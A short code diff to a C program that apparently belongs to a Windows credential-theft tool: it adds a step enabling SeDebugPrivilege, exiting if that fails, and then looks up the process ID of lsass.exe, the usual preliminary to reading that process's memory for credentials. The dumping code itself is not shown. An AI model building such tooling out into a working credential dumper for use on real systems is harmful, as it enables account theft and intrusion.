@@ -37,6 +37,17 @@ int main(int argc, char** argv)
 		return 1;
 	}
 
+	if (SetPrivilege(currentTokenHandle, "SeDebugPrivilege", TRUE))
+	{
+		printf("[+] SeDebugPrivilege enabled!\n");
+	}
+	else
+	{
+		printf("[-] SeDebugPrivilege not enabled!\n");
+		printf("[-] Exiting!\n");
+		return 1;
+	}
+	
 	char* processName = "lsass.exe";
 	int PID = FindTarget(processName);
 	
